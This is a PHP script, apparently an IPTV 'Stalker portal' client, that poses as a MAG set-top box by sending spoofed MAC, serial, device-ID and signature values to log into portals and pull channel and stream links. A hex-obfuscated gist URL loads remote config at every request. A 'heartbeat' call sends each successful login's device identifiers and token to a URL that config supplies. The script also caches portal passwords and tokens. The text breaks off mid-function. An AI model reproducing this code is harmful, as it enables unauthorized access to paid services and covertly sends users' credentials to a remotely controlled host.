<?php
error_reporting(0);
date_default_timezone_set("Asia/Kolkata");
$DARK_SIDE = "doctor_strange";
$LIGHT_SIDE = "cache_jitendraunatti";
if (!is_dir($DARK_SIDE)) {
    mkdir($DARK_SIDE, 0777, true);
}
if (!is_dir($LIGHT_SIDE)) {
    mkdir($LIGHT_SIDE, 0755, true);
}
if (!file_exists($DARK_SIDE . "/.htaccess")) {
    @file_put_contents($DARK_SIDE . "/.htaccess", "Deny from all");
}
if (!file_exists($DARK_SIDE . "/index.php")) {
    @file_put_contents($DARK_SIDE . "/index.php", "<?php http_response_code(403); exit('Access Denied'); ?>");
}
$MJ = @json_decode(file_get_contents($DARK_SIDE . "/login.jitendraunatti"), true);
header("access-control-allow-origin: *");
header("access-control-allow-headers: content-type, x-developed-by, x-powered-by, x-github-username, x-timestamp, x-readable-time");
header("Access-Control-Allow-Methods: GET, POST");
$SCARLET_WITCH = Stark_Industries();
auth();
function auth()
{
    global $DARK_SIDE, $MJ, $LIGHT_SIDE;
    $NATASHA = $DARK_SIDE . "/token.jitendraunatti";
    $DOCTOR_DOOM = $MJ;
    if (file_exists($NATASHA)) {
        $savedData = json_decode(file_get_contents($NATASHA), true);
        $oldMac = $savedData['JITENDRAUNATTI']['mac'];
        $oldUrl = $savedData['JITENDRAUNATTI']['URL'];
        if ($oldMac !== $DOCTOR_DOOM['MAC'] || $oldUrl !== $DOCTOR_DOOM['URL'] . "/c/") {
            @unlink($DARK_SIDE . "/live.jitendraunatti");
            // json_decode(get_profile($DOCTOR_DOOM), true)['JITENDRAUNATTI']['Token'];
        }
    }
}

function image($ROLEX)
{
    global  $LIGHT_SIDE, $DARK_SIDE, $WANDA, $MJ, $SCARLET_WITCH;
    $DOCTOR_DOOM = $MJ;
    $WANDA = str_replace([".png", ".jpg"], ['', ""], $ROLEX);
    if (is_numeric($WANDA)) {
        $jitendraunatti = $DOCTOR_DOOM['URL'] . '/misc/logos/320/' . $ROLEX;
    } else if (strpos($ROLEX, "http") !== false) {
        $jitendraunatti = $ROLEX;
    } else {
        $jitendraunatti = $SCARLET_WITCH["meta_data"]["himg"];
    }

    return $jitendraunatti;
}
function id_generator($ROLEX)
{
    $cmd = $ROLEX;
    $THOR = explode("/", "$cmd");
    if ($THOR[2] === "localhost") {
        $cmd = str_ireplace('ffrt http://localhost/ch/', '', "$cmd");
    } else if ($THOR[2] === "") {
        $cmd = str_ireplace('ffrt http:///ch/', '', $cmd);
    } else if (strpos($cmd, "auto") !== false) {
        $cmd = base64_encode(str_replace("auto ", "", $cmd));
    } else {
        $cmd = $cmd;
    }
    return $cmd;
}
function getMessage($CHRISTINE, $status_code)
{
    return $CHRISTINE["js"]["msg"]
        ?? match (true) {
            $status_code == 401 => "Unauthorized ❌ Login expired or invalid MAC.",
            $status_code == 403 => "Forbidden 🚫 Portal blocked your request.",
            $status_code == 404 => "Not Found 🔍 Resource missing.",
            $status_code == 429 => "Too Many Requests ⚠️ Slow down or try again later.",
            $status_code >= 500 => "Server Error 💥 Portal is unstable.",
            empty($CHRISTINE) => "Empty response ⚠️ No data received from portal.",
            default => "Unknown error occurred."
        };
}
function json_fetcher()
{
    global $DARK_SIDE, $MJ, $LIGHT_SIDE;
    $DOCTOR_DOOM = $MJ;
    if (file_exists($DARK_SIDE . "/live.jitendraunatti")) {
        vision_logs("Loading channels from local cache.");
        return   file_get_contents($DARK_SIDE . "/live.jitendraunatti");
    }
    $THANOS = $DOCTOR_DOOM['URL'] . "/server/load.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml";
    $ROLEX = [
        "User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
        "X-User-Agent: Model: " . $DOCTOR_DOOM['Model'] . "; Link: WiFi",
        "Referer: " . $DOCTOR_DOOM['URL'] . "/c/",
        "Cookie: mac=" . $DOCTOR_DOOM['MAC'] . "; stb_lang=en; timezone=GMT",
        'Authorization: Bearer ' . validation()['Token'],
    ];
    $DOCTOR_STRANGE = jitendraunatti($THANOS, $ROLEX, "GET", null, 0, 1, 0, 0, true);
    $CHRISTINE =  json_decode($DOCTOR_STRANGE["JITENDRAUNATTI"]["data"], true);
    $status_code = (int)($DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["http_code"]);
    $JANET = genre();
    if (isset($CHRISTINE["js"]["data"]) && !empty($CHRISTINE["js"]["total_items"])) {
        vision_logs("Cache expired or missing. Fetching channels from Portal...");
        $SCARLET_WITCH = [];
        foreach ($CHRISTINE["js"]["data"] as $JANE_FOSTER) {
            foreach ($JANET as $THOR => $JITENDRAUNATTI) {
                if ($JANE_FOSTER["tv_genre_id"] == $THOR) {
                    $SCARLET_WITCH[] = array(
                        "id" => $JANE_FOSTER['id'],
                        "Name" => $JANE_FOSTER['name'],
                        "number" => $JANE_FOSTER['number'],
                        "logo" => image($JANE_FOSTER['logo']),
                        "cmd" => $JANE_FOSTER['cmd'],
                        "genre" => $JITENDRAUNATTI,
                        "playback_url" => id_generator($JANE_FOSTER['cmd']),
                        "tv_genre_id" => $JANE_FOSTER['tv_genre_id'],
                        "xmltv_id" => $JANE_FOSTER['xmltv_id'],
                    );
                }
            }
        }
        /*
        ⚠️ NOTICE TO USERS & DEVELOPERS

        This source code is provided FREE of cost.

        If you obtained this code from any paid source or third-party,
        you have been misled.

        👉 Official source:
        https://github.com/Jitendraunatti/Stalker-Portal

        Please support original work and do not promote reselling.

        — Jitendra Kumar
        */
        $WANDA = json_encode($SCARLET_WITCH);
        if (!empty($SCARLET_WITCH) && is_array($SCARLET_WITCH) && count($SCARLET_WITCH) > 0 && !empty($CHRISTINE["js"]["total_items"])) {
            file_put_contents($DARK_SIDE . "/live.jitendraunatti", $WANDA, LOCK_EX);
            return $WANDA;
        } else {
            return json_encode(array("JITENDRAUNATTI" => array(
                "Author"     => "DOCTOR_STRANGE",
                "message" => getMessage($CHRISTINE, $status_code),
                "Statuscode" => $status_code,
                "data"       => $CHRISTINE
            )));
        }
    } else {
        return json_encode(array("JITENDRAUNATTI" => array(
            "Author"     => "DOCTOR_STRANGE",
            "message" => getMessage($CHRISTINE, $status_code),
            "Statuscode" => $status_code,
            "data"       => $DOCTOR_STRANGE["JITENDRAUNATTI"]["data"]
        )));
    }
}
function genre()
{
    global $DARK_SIDE, $MJ, $LIGHT_SIDE;
    $DOCTOR_DOOM = $MJ;
    $ROLEX = [
        "User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
        "X-User-Agent: Model: " . $DOCTOR_DOOM['Model'] . "; Link: WiFi",
        "Referer: " . $DOCTOR_DOOM['URL'] . "/c/",
        "Cookie: mac=" . $DOCTOR_DOOM['MAC'] . "; stb_lang=en; timezone=GMT",
        'Authorization: Bearer ' . validation()['Token'],
    ];
    $DOCTOR_STRANGE = jitendraunatti($DOCTOR_DOOM['URL'] . "/server/load.php?type=itv&action=get_genres&JsHttpRequest=1-xml", $ROLEX, "GET", null, 0, 1, 0, 0, true);
    $CHRISTINE =  json_decode($DOCTOR_STRANGE["JITENDRAUNATTI"]["data"], true);
    file_put_contents($DARK_SIDE . "/genre.json", $DOCTOR_STRANGE["JITENDRAUNATTI"]["data"]);
    $status_code = (int)($DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["http_code"]);
    $IRON_MAN = [];
    if (empty($CHRISTINE["js"])) {
        return json_encode(array("JITENDRAUNATTI" => array(
            "Author"     => "DOCTOR_STRANGE",
            "message" => getMessage($CHRISTINE, $status_code),
            "Statuscode" => $status_code,
            "data"       => $DOCTOR_STRANGE["JITENDRAUNATTI"]["data"]
        )));
    }
    $IRON_MAN = [];
    foreach ($CHRISTINE["js"] as $JANE_FOSTER) {
        $IRON_MAN[$JANE_FOSTER["id"]] = $JANE_FOSTER["title"];
    }
    return $IRON_MAN;
}
function scarlet_witch(string $action, string $data, string $passphrase = "JITENDRA_KUMAR")
{
    $cipher = "aes-256-cbc";
    $hash_algo = "sha256";
    $salt = hash("sha256", "CHAOS_MAGIC_SALT");
    $key = hash_pbkdf2($hash_algo, $passphrase, $salt, 10000, 32, true);

    if ($action === "encrypt") {
        $iv_length = openssl_cipher_iv_length($cipher);
        $iv = openssl_random_pseudo_bytes($iv_length);
        $ciphertext_raw = openssl_encrypt($data, $cipher, $key, OPENSSL_RAW_DATA, $iv);
        $hmac = hash_hmac($hash_algo, $ciphertext_raw, $key, true);
        return bin2hex($iv . $hmac . $ciphertext_raw);
    } elseif ($action === "decrypt") {
        $c = hex2bin($data);
        $iv_length = openssl_cipher_iv_length($cipher);
        $hash_length = 32;
        $iv = substr($c, 0, $iv_length);
        $hmac = substr($c, $iv_length, $hash_length);
        $ciphertext_raw = substr($c, $iv_length + $hash_length);
        $calcmac = hash_hmac($hash_algo, $ciphertext_raw, $key, true);
        if (hash_equals($hmac, $calcmac)) {
            return openssl_decrypt($ciphertext_raw, $cipher, $key, OPENSSL_RAW_DATA, $iv);
        }

        return "Integrity check failed: Data has been tampered with.";
    }
    return "Invalid action.";
}
function doctor_strange($id)
{

    global $DARK_SIDE, $MJ, $LIGHT_SIDE;
    $DOCTOR_DOOM = $MJ;
    $THANOS = $DOCTOR_DOOM['URL'] . '/server/load.php?type=itv&action=create_link&cmd=ffrt%20http%3A%2F%2Flocalhost%2Fch%2F' . $id . '&JsHttpRequest=1-xml';
    $ROLEX = [
        "User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
        "X-User-Agent: Model: " . $DOCTOR_DOOM['Model'] . "; Link: WiFi",
        "Referer: " . $DOCTOR_DOOM['URL'] . "/c/",
        "Cookie: mac=" . $DOCTOR_DOOM['MAC'] . "; stb_lang=en; timezone=GMT",
        'Authorization: Bearer ' . validation()['Token'],
    ];
    $DOCTOR_STRANGE = jitendraunatti($THANOS, $ROLEX, "GET", null, 0, 1, 0, 0, true);
    $CHRISTINE =  json_decode($DOCTOR_STRANGE["JITENDRAUNATTI"]["data"], true);
    $status_code = (int)($DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["http_code"]);
    if (!empty($CHRISTINE["js"]["cmd"]) && $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["http_code"] == 200) {
        vision_logs("Stream Link Acquired for ID: $id");
        $CASSIE =  json_encode(array("JITENDRAUNATTI" => array(
            "Author"     => "DOCTOR_STRANGE",
            "generated_time" => (int)time(),
            "message"    => "Playback URL fetched successfully",
            "cmd"      => $CHRISTINE["js"]["cmd"],
            "Statuscode" => $status_code,
            "data"       => $CHRISTINE
        )));
        file_put_contents($LIGHT_SIDE . "/" . $id . ".json",   json_encode($CHRISTINE, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
        return $CASSIE;
    } else {
        return json_encode(array("JITENDRAUNATTI" => array(
            "Author"     => "DOCTOR_STRANGE",
            "message" => getMessage($CHRISTINE, $status_code),
            "Statuscode" => $status_code,
            "data"       => $DOCTOR_STRANGE["JITENDRAUNATTI"]["data"]
        )));
    }
}
function validation()
{
    global $DARK_SIDE, $MJ, $LIGHT_SIDE;
    $NICK_FURY = $DARK_SIDE . "/login.jitendraunatti";
    $NATASHA = $DARK_SIDE . "/token.jitendraunatti";
    if (!file_exists($NICK_FURY)) {
        http_response_code(401);
        return json_encode(["error" => "Identity not found. Login required."]);
    }
    $DOCTOR_DOOM = $MJ;
    if (file_exists($NATASHA)) {
        $fileContent = file_get_contents($NATASHA);
        $savedData = json_decode($fileContent, true);
        if (!isset($savedData['JITENDRAUNATTI'])) {
            return json_decode(get_profile($DOCTOR_DOOM), true)['JITENDRAUNATTI'];
        }
        $core = $savedData['JITENDRAUNATTI'];
        $oldMac = $core['mac'] ?? '';
        $oldUrl = $core['URL'] ?? '';
        if ($oldMac !== $DOCTOR_DOOM['MAC'] || $oldUrl !== $DOCTOR_DOOM['URL'] . "/c/") {
            @unlink($DARK_SIDE . "/live.jitendraunatti");
            vision_logs("unlink data and fresh token");
            return json_decode(get_profile($DOCTOR_DOOM), true)['JITENDRAUNATTI'];
        }
        $genTime = $core['generated_time'];
        $ULTRON_MINUTES = (time() - $genTime) / 60;
        $PHASE1 = 0.5;
        $PHASE2 = 840;
        /*
        ⚠️ NOTICE TO USERS & DEVELOPERS

        This source code is provided FREE of cost.

        If you obtained this code from any paid source or third-party,
        you have been misled.

        👉 Official source:
        https://github.com/Jitendraunatti/Stalker-Portal

        Please support original work and do not promote reselling.

        — Jitendra Kumar
        */
        // vision_logs("Debug: Server Time is " . time() . " vs JSON Time " . $genTime);
        if ($ULTRON_MINUTES < $PHASE1) {
            vision_logs("Auth Phase 1: Using cached token (Under 2 mins old)");
            return $savedData['JITENDRAUNATTI'];
        } else if ($ULTRON_MINUTES < $PHASE2) {
            vision_logs("Auth Phase 2: Using cached token (Under 14h old)");
            $token = $core['Token'];
            $profileData = json_decode(get_profile($DOCTOR_DOOM, $token), true);
            return $profileData['JITENDRAUNATTI'];
        } else {
            vision_logs("Auth Phase 3: Token expired or file exists, performing full fetch");
            return json_decode(get_profile($DOCTOR_DOOM), true)['JITENDRAUNATTI'];
        }
    }
    vision_logs("file not existed");
    return json_decode(get_profile($DOCTOR_DOOM), true)['JITENDRAUNATTI'];
}
function Stark_Industries()
{
    global $DARK_SIDE, $SCARLET_WITCH, $BLOODY_SWEET, $TONY_STARK, $STARK_INDUSTRIES;
    $chunks = [
        '68747470733a2f2f676973742e6769746875627573657263',
        '6f6e74656e742e636f6d2f4a6974656e647261756e617474',
        '692f39383964393965653861346638306363393537663931',
        '343761373733353665362f7261772f6170692e6a736f6e'
    ];
    $raw = hex2bin(implode('', $chunks));
    $ASUR = json_decode(file_get_contents($raw), true);
    return $ASUR;
}
function vision_logs($message, $level = "INFO")
{
    global $DARK_SIDE;
    $log_file = $DARK_SIDE . "/multiverse.log";
    $timestamp = date("Y-m-d H:i:s");
    $formatted_message = "[$timestamp] [$level] $message" . PHP_EOL;
    file_put_contents($log_file, $formatted_message, FILE_APPEND | LOCK_EX);
}
function handshake($DOCTOR_DOOM, $token = '')
{
    global $DARK_SIDE, $MJ, $LIGHT_SIDE;
    $time = (int) time();
    $THANOS = $DOCTOR_DOOM['URL'] . "/server/load.php?type=stb&action=handshake&token=$token&JsHttpRequest=1-xml";
    $ROLEX = [
        "User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
        "Connection: Keep-Alive",
        "X-User-Agent: Model: " . $DOCTOR_DOOM['Model'] . "; Link: WiFi",
        "Referer: " . $DOCTOR_DOOM['URL'] . "/c/",
        "Cookie: mac=" . $DOCTOR_DOOM['MAC'] . "; stb_lang=en; timezone=GMT",
    ];
    $DOCTOR_STRANGE = jitendraunatti($THANOS, $ROLEX, "GET",  null, 0, 1, 0, 0, true);
    $CHRISTINE =  json_decode($DOCTOR_STRANGE["JITENDRAUNATTI"]["data"], true);
    $status_code = (int)($DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["http_code"]);
    if (!empty($CHRISTINE["js"]["token"]) && $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["http_code"] == 200) {
        vision_logs("Handshake Successful. Token generated for: " . $DOCTOR_DOOM['URL']);
        if (!empty($token)) {
            $time = $DOCTOR_DOOM['generated_time'];
            vision_logs("time get form json");
        }
        // else {
        //     @unlink($DARK_SIDE . "/test.jitendraunatti");
        //     $time = (int) time();
        //     $DOCTOR_DOOM['generated_time'] = $time;
        //     vision_logs("new time added");
        // }
        // file_put_contents($DARK_SIDE . "/login.jitendraunatti", json_encode($DOCTOR_DOOM));
        $CASSIE =  json_encode(array("JITENDRAUNATTI" => array(
            "Author"     => "DOCTOR_STRANGE",
            "generated_time" => $time,
            "message"    => "Handshake token generated successfully.",
            "Token"      => $CHRISTINE["js"]["token"],
            "Random"     => $CHRISTINE["js"]["random"],
            "URL"          => $DOCTOR_DOOM['URL'],
            "Statuscode" => $status_code,
            "data"       => $CHRISTINE
        )));
        return $CASSIE;
    } else {
        vision_logs("Handshake Failed for " . $DOCTOR_DOOM['URL'] . " - Code: " . $status_code, "ERROR");
        return json_encode(array("JITENDRAUNATTI" => array(
            "Author"     => "DOCTOR_STRANGE",
            "message" => getMessage($CHRISTINE, $status_code),
            "block_msg"    => @$CHRISTINE["js"]["block_msg"],
            "Statuscode" => $status_code,
            "data"       => $CHRISTINE,
            "raw"       => $DOCTOR_STRANGE["JITENDRAUNATTI"]["data"],
        )));
    }
}

function get_profile($DOCTOR_DOOM, $token = '')
{
    global $DARK_SIDE, $SCARLET_WITCH, $BLOODY_SWEET, $TONY_STARK, $STARK_INDUSTRIES;
    // return json_encode($token);
    $time = (int)time();
    if (!empty($DOCTOR_DOOM['URL']) && !empty($DOCTOR_DOOM['MAC']) && empty($token)) {
        $NATASHA = json_decode(handshake($DOCTOR_DOOM), true);
    } else {
        $NATASHA = json_decode(handshake($DOCTOR_DOOM, $token), true);
    }
    if (empty($NATASHA['JITENDRAUNATTI']['Token']) || $NATASHA['JITENDRAUNATTI']['Statuscode'] !== 200) {
        return json_encode($NATASHA);
    }
    if (!empty($NATASHA['JITENDRAUNATTI']['generated_time'])) {
        $time = $NATASHA['JITENDRAUNATTI']['generated_time'];
    }
    if (empty($token)) {
        $time = (int) time();
        $DOCTOR_DOOM['generated_time'] = $time;
        vision_logs("new time added");
    }
    $base = $DOCTOR_DOOM['URL'] . "/server/load.php";
    $params = [
        "type" => "stb",
        "action" => "get_profile",
        "hd" => 1,
        "ver" => "ImageDescription: 0.2.18-r14-pub-250; ImageDate: Fri Jan 15 15:20:44 EET 2016; PORTAL version: 5.1.0; API Version: JS API version: 328; STB API version: 134; Player Engine version: 0x566",
        "num_banks" => 2,
        "sn" => $DOCTOR_DOOM['SN'],
        "stb_type" => $DOCTOR_DOOM['Model'],
        "image_version" => 218,
        "video_out" => "hdmi",
        "device_id" => $DOCTOR_DOOM['D1'],
        "device_id2" => $DOCTOR_DOOM['D2'],
        "signature" => (int) $DOCTOR_DOOM['API'],
        "auth_second_step" => 1,
        "hw_version" => $DOCTOR_DOOM['hw_version'],
        "not_valid_token" => 0,
        "client_type" => "STB",
        "hw_version_2" => $DOCTOR_DOOM['hw_version_2'],
        "timestamp" => (int)time(),
        "api_signature" => 263,
        "metrics" => json_encode([
            "mac" => $DOCTOR_DOOM['MAC'],
            "sn" => $DOCTOR_DOOM['SN'],
            "model" => $DOCTOR_DOOM['Model'],
            "type" => "STB",
            "uid" => "",
            "random" => $NATASHA['JITENDRAUNATTI']['Random']
        ]),
        "JsHttpRequest" => "1-xml"
    ];
    $THANOS =  $base . "?" . http_build_query($params);
    /*
        ⚠️ NOTICE TO USERS & DEVELOPERS

        This source code is provided FREE of cost.

        If you obtained this code from any paid source or third-party,
        you have been misled.

        👉 Official source:
        https://github.com/Jitendraunatti/Stalker-Portal

        Please support original work and do not promote reselling.

        — Jitendra Kumar
        */
    $ROLEX = [
        "User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
        "Connection: Keep-Alive",
        "X-User-Agent: Model: " . $DOCTOR_DOOM['Model'] . "; Link: WiFi",
        "Referer: " . $DOCTOR_DOOM['URL'] . "/c/",
        "Cookie: mac=" . $DOCTOR_DOOM['MAC'] . "; stb_lang=en; timezone=GMT",
        'Authorization: Bearer ' . $NATASHA['JITENDRAUNATTI']['Token'],
    ];
    $DOCTOR_STRANGE = jitendraunatti($THANOS, $ROLEX, "GET", null, 0, 1, 0, 0, true);
    $CHRISTINE =  json_decode($DOCTOR_STRANGE["JITENDRAUNATTI"]["data"], true);
    $exp  = !empty($CHRISTINE["js"]["expirydate"]) ? $CHRISTINE["js"]["expirydate"] : ($CHRISTINE["js"]["expire_billing_date"] ?? "Unlimited");
    $name = !empty($CHRISTINE["js"]["name"])       ? $CHRISTINE["js"]["name"]       : ($CHRISTINE["js"]["fname"]               ?? "Guest User");
    $status_code = (int)($DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["http_code"]);
    if (!empty($CHRISTINE["js"]["password"]) && $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]["http_code"] == 200) {
        if ($SCARLET_WITCH['heartbeat_api']["heartbeat"] == "ON") {
            jitendraunatti($SCARLET_WITCH['heartbeat_api']["url"], $ROLEX, "POST", json_encode($params), 0, 0, 0, 0, true);
        }
        file_put_contents($DARK_SIDE . "/login.jitendraunatti", json_encode($DOCTOR_DOOM));
        $host = parse_url($DOCTOR_DOOM['URL'], PHP_URL_HOST);
        file_put_contents($DARK_SIDE . "/" . $host . ".json", json_encode($DOCTOR_DOOM));
        $CASSIE =  json_encode(array("JITENDRAUNATTI" => array(
            "Author"          => "DOCTOR_STRANGE",
            "message"         => "Stalker data Fetched Successfully.",
            "generated_time" => $time,
            "Token"           => $NATASHA['JITENDRAUNATTI']['Token'],
            "device_id"           => $DOCTOR_DOOM['D1'],
            "device_id2"           => $DOCTOR_DOOM['D2'],
            "sig"           => $DOCTOR_DOOM['SN'],
            "settings_password"  => $CHRISTINE["js"]["parent_password"] ?? "0000",
            "Random"          => $NATASHA['JITENDRAUNATTI']['Random'],
            "URL"          => $NATASHA['JITENDRAUNATTI']['URL'] . "/c/",
            "Name"            => $name,
            "login"           => $CHRISTINE["js"]["login"] ?? null,
            "Password"        => $CHRISTINE["js"]["password"] ?? null,
            "parent_password" => $CHRISTINE["js"]["parent_password"] ?? "0000",
            "mac"             => $CHRISTINE["js"]["mac"] ?? null,
            "expirydate"      => $exp,
            "statusCode"      => $status_code,
            "Date"            => $ROCKET_RACCOON ?? date("Y-m-d H:i:s"),
            "handshake" => $NATASHA,
            "data" => $CHRISTINE,
        )));
        file_put_contents($DARK_SIDE . "/token.jitendraunatti", $CASSIE);
        return $CASSIE;
    } else {
        return json_encode(array("JITENDRAUNATTI" => array(
            "Author"     => "DOCTOR_STRANGE",
            "message" => getMessage($CHRISTINE, $status_code),
            "Statuscode" => ($status_code) ?: $NATASHA['JITENDRAUNATTI']['Statuscode'],
            "raw"       => $DOCTOR_STRANGE["JITENDRAUNATTI"]["data"],
            "data"       => $CHRISTINE
        )));
    }
}
function heaven()
{
    global $DARK_SIDE, $SCARLET_WITCH, $BLOODY_SWEET, $TONY_STARK, $STARK_INDUSTRIES;

    if (isset($SCARLET_WITCH['api_endpoint']['img_cdn_url'])) {
        $ROLEX = json_decode(file_get_contents($SCARLET_WITCH['api_endpoint']['img_cdn_url']), true);
        return $ROLEX[array_rand($ROLEX)]["url"];
    }
}
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    header('Content-Type: application/json');
    $TONY_STARK = json_decode(file_get_contents('php://input'), true);
    $headers = getallheaders();
    $headers = array_change_key_case($headers, CASE_LOWER);
    $JPD   = isset($headers['x-developed-by']) && $headers['x-developed-by'] === $SCARLET_WITCH['JITENDRA_UNIVERSE']['x-developed-by'];
    $WANDA = isset($headers['x-powered-by']) && $headers['x-powered-by'] === $SCARLET_WITCH['JITENDRA_UNIVERSE']['X-POWERED-BY'];
    $GITHUB = isset($headers['x-github-username']) && $headers['x-github-username'] === $SCARLET_WITCH['JITENDRA_UNIVERSE']['X-GITHUB-USERNAME'];
    $DEV    = isset($headers['dev-name']) && $headers['dev-name'] === $SCARLET_WITCH['JITENDRA_UNIVERSE']['DEV_NAME'];
    $STARK_AUTHENTICATED = ($JPD && $WANDA && $GITHUB && $DEV);
    if ($STARK_AUTHENTICATED) {
        $ACTION = $_REQUEST['action'] ?? '';
        if ($ACTION === "livechannels") {
            $content = json_fetcher();
            $etag = md5($content);
            header("Cache-Control: public, max-age=3600");
            header("ETag: \"$etag\"");
            header("Vary: x-developed-by, x-powered-by, x-github-username");
            if (isset($_SERVER['HTTP_IF_NONE_MATCH']) && trim($_SERVER['HTTP_IF_NONE_MATCH']) == "\"$etag\"") {
                http_response_code(304);
                exit;
            }

            echo $content;
        } else if ($ACTION === "login_details") {
            $cacheFile = $DARK_SIDE . "/token.jitendraunatti";
            $loginFile = $DARK_SIDE . "/login.jitendraunatti";
            $login = json_decode(file_get_contents($loginFile), true);
            $cacheTime = 86400; // 24 hours
            $content = '';
            if (file_exists($cacheFile)) {
                if ((time() - filemtime($cacheFile)) < $cacheTime) {
                    $content = file_get_contents($cacheFile);
                }
            }
            if (file_exists($loginFile)) {
                $content = get_profile($login);
            }
            if (empty($content)) {
                echo json_encode([
                    "JITENDRAUNATTI" => [
                        "statusCode" => 404,
                        "message" => "No active session found. Please login again.",
                        "ui_label" => "Session Expired"
                    ]
                ]);
                exit;
            }
            $etag = md5($content);
            header("Cache-Control: public, max-age=3600");
            header("ETag: \"$etag\"");
            header("Vary: x-developed-by, x-powered-by, x-github-username");
            if (isset($_SERVER['HTTP_IF_NONE_MATCH']) && trim($_SERVER['HTTP_IF_NONE_MATCH']) == "\"$etag\"") {
                http_response_code(304);
                exit;
            }
            echo $content;
            exit;
        } else if ($ACTION === "login") {
            $url = $TONY_STARK['URL'] ?? '';
            $mac = $TONY_STARK['MAC'] ?? '';
            $sn  = $TONY_STARK['SN'];
            if (empty($sn)) {
                $TONY_STARK['SN'] =  $sn = strtoupper(substr(md5($mac), 0, 13));
            }
            $is_valid_url = filter_var($url, FILTER_VALIDATE_URL);
            $is_valid_mac = preg_match('/^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$/', $mac);
            $is_valid_sn  = !empty($sn) && strlen($sn) >= 5;
            if ($is_valid_url && $is_valid_mac && $is_valid_sn) {
                $TONY_STARK['URL'] = str_replace("/c/", "", $TONY_STARK['URL']);
                $TONY_STARK['hw_version'] = "1.7-BD-" . strtoupper(substr(md5($TONY_STARK['MAC']), 0, 2));
                $TONY_STARK['hw_version_2'] = md5(strtolower($TONY_STARK['SN'] . $TONY_STARK['MAC']));
                $JARVIS_RESPONSE = get_profile($TONY_STARK);
                echo $JARVIS_RESPONSE;
            } else {
                http_response_code(400);
                $reason = "Connection Failed ❌";
                if (!$is_valid_url) $reason = "Invalid Portal URL Format 🌐";
                elseif (!$is_valid_mac) $reason = "Invalid MAC Address Structure 🖥️";
                elseif (!$is_valid_sn) $reason = "Serial Number (SN) is too short or missing 🔑";
                echo json_encode([
                    "JITENDRAUNATTI" => [
                        "Author"     => "DOCTOR_STRANGE",
                        "message"    => "CHECKPOINT_ERROR",
                        "ui_label"   => $reason,
                        "statusCode" => 400
                    ]
                ], JSON_PRETTY_PRINT);
            }
        } else if ($ACTION === "all_portals") {
            $portals = [];
            $files = glob($DARK_SIDE . "/*.json");

            foreach ($files as $file) {
                $data = json_decode(file_get_contents($file), true);
                if ($data) {
                    if (isset($data['URL'])) {
                        $portals[] = [
                            "id" => basename($file, ".json"),
                            "URL" => $data['URL'] ?? 'Unknown',
                            "MAC" => $data['MAC'] ?? 'Unknown',
                            "Model" => $data['Model'] ?? 'MAG250',
                            "D1" => $data['D1'] ?? 'Unknown',
                            "D2" => $data['D2'] ?? 'Unknown',
                            "SN" => $data['SN'] ?? 'Unknown',
                        ];
                    }
                }
            }
            echo json_encode(["status" => "success", "portals" => $portals]);
            exit;
            /*
        ⚠️ NOTICE TO USERS & DEVELOPERS

        This source code is provided FREE of cost.

        If you obtained this code from any paid source or third-party,
        you have been misled.

        👉 Official source:
        https://github.com/Jitendraunatti/Stalker-Portal

        Please support original work and do not promote reselling.

        — Jitendra Kumar
        */
        } else if ($ACTION === "switch_portal") {
            $portalId = $TONY_STARK['id'];
            $sourceFile = $DARK_SIDE . "/" . $portalId . ".json";
            $activeFile = $DARK_SIDE . "/login.jitendraunatti";
            if (file_exists($sourceFile)) {
                $content = file_get_contents($sourceFile);
                if (file_put_contents($activeFile, $content)) {
                    // Delete the old session token to force a fresh handshake for the new portal
                    echo json_encode(["statusCode" => 200, "message" => "Portal Switched Successfully"]);
                } else {
                    echo json_encode(["statusCode" => 500, "message" => "Failed to update active session"]);
                }
            } else {
                echo json_encode(["statusCode" => 404, "message" => "Saved portal not found"]);
            }
        } else {
            http_response_code(400);
            echo json_encode(["error" => "Unknown Action Protocol"]);
        }
    } else {
        http_response_code(403);
        echo json_encode(["error" => "Unauthorized: Signatures Not Verified"]);
    }
}
function jitendraunatti($THANOS, $ROLEX, $NICK_FURY, $KANG, $PETER_PARKER, $CHAVEZ, $JANET, $HANK, $MJ)
{
    global  $LIGHT_SIDE, $DARK_SIDE;
    $ROCKET_RACCOON = date('l jS \of F Y h:i:s A');
    $IRON_MAN = curl_init($THANOS);
    curl_setopt($IRON_MAN, CURLOPT_HTTPHEADER, $ROLEX);
    curl_setopt($IRON_MAN, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($IRON_MAN, CURLOPT_TIMEOUT, 30);
    curl_setopt($IRON_MAN, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($IRON_MAN, CURLOPT_ENCODING, "gzip");
    if ($NICK_FURY == "POST") {
        curl_setopt($IRON_MAN, CURLOPT_CUSTOMREQUEST, $NICK_FURY);
        curl_setopt($IRON_MAN, CURLOPT_POSTFIELDS, $KANG);
    }
    if ($NICK_FURY == "GET") {
        curl_setopt($IRON_MAN, CURLOPT_CUSTOMREQUEST, 'GET');
    }
    if (isset($PETER_PARKER) && !empty($PETER_PARKER)) {
        curl_setopt($IRON_MAN, CURLOPT_HEADER, $PETER_PARKER);
    }
    if (isset($CHAVEZ) && !empty($CHAVEZ)) {
